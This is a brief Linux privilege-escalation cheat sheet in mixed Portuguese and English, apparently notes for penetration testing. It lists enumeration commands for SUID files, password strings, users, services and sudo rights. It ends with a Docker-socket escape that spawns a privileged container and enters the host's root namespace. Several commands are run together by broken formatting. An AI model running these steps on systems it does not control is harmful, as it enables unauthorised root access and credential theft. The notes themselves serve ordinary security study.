# Escalação de Privilégios

find

* Locate SUID/SGID files:

\-perm +6000 -type f-perm +6000 -user root -type f(2000 = SGID, 4000 = SUID, 6000 = SUID+SGID)

* Search by name:

\-name \*.log

* Run commands on each item:

\-exec grep 'password' {} \\;\
What's the OS? What version? What architecture?

* cat /etc/\*-release
* uname -i
* lsb\_release -a (Debian based OSs)

\
Who are we? Where are we?

* id
* pwd

\
Who uses the box? What users? (And which ones have a valid shell)

* cat /etc/passwd
* grep -vE "nologin|false" /etc/passwd

What's currently running on the box? What active network services are there?

* ps aux
* netstat -antup

\
What's installed? What kernel is being used?

* dpkg -l (Debian based OSs)
* rpm -qa (CentOS / openSUSE )
* uname -a

\
\# procurar por arquivos com permissão totalfind / -type f -perm 0777 2>/dev/null\
$ sudo -l # list binaries with sudo privies\
Dockerdocker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
